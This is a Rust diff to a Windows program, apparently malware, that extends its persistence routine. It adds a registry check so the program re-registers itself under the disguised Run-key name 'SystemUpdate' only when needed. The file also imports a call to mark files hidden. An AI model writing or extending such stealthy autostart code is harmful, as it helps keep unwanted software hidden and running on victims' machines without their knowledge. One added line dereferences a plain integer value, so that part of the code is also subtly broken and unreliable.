@@ -7,11 +7,13 @@ use std::fs;
 use std::iter::once;
 use std::mem;
 use std::os::windows::ffi::OsStrExt;
+use std::path::Path;
 use std::ptr;
 use windows_sys::Win32::Foundation::HANDLE;
 use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
 use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
+    RegCloseKey, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_READ,
+    KEY_SET_VALUE, REG_SZ,
 };
 
 #[cfg(windows)]
@@ -32,6 +34,64 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
         .encode_wide()
         .chain(once(0))
         .collect();
+    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
+        .encode_wide()
+        .chain(once(0))
+        .collect();
+
+    // Check if the startup entry already exists and points to a valid file
+    let mut hkey_read = mem::MaybeUninit::uninit();
+    if RegOpenKeyExW(
+        HKEY_CURRENT_USER,
+        run_key_path.as_ptr(),
+        0,
+        KEY_READ,
+        hkey_read.as_mut_ptr(),
+    ) == 0
+    {
+        let hkey_read = hkey_read.assume_init();
+        let mut data_type = mem::MaybeUninit::uninit();
+        let mut data_size = 0;
+
+        // First, query the size of the data
+        if RegQueryValueExW(
+            hkey_read,
+            app_name.as_ptr(),
+            ptr::null_mut(),
+            data_type.as_mut_ptr(),
+            ptr::null_mut(),
+            &mut data_size,
+        ) == 0
+        {
+            if *data_type.assume_init() == REG_SZ {
+                let mut data_buffer: Vec<u16> = vec![0; (data_size / 2) as usize];
+                if RegQueryValueExW(
+                    hkey_read,
+                    app_name.as_ptr(),
+                    ptr::null_mut(),
+                    ptr::null_mut(),
+                    data_buffer.as_mut_ptr() as *mut u8,
+                    &mut data_size,
+                ) == 0
+                {
+                    // Null bytes might be included, so we need to handle that.
+                    let end = data_buffer
+                        .iter()
+                        .position(|&x| x == 0)
+                        .unwrap_or(data_buffer.len());
+                    let path_str = String::from_utf16_lossy(&data_buffer[..end]);
+                    if Path::new(&path_str).exists() {
+                        RegCloseKey(hkey_read);
+                        // The registry key exists and points to a valid file, so we're done.
+                        return Ok(());
+                    }
+                }
+            }
+        }
+        RegCloseKey(hkey_read);
+    }
+
+    // If the check fails or the key doesn't exist, proceed to create it.
     let mut hkey = mem::MaybeUninit::uninit();
 
     if RegOpenKeyExW(
@@ -46,10 +106,6 @@ unsafe fn add_to_startup(file_path: &str) -> Result<(), String> {
     }
 
     let hkey = hkey.assume_init();
-    let app_name: Vec<u16> = OsStr::new("SystemUpdate")
-        .encode_wide()
-        .chain(once(0))
-        .collect();
     let file_path_w: Vec<u16> = OsStr::new(file_path)
         .encode_wide()
         .chain(once(0))
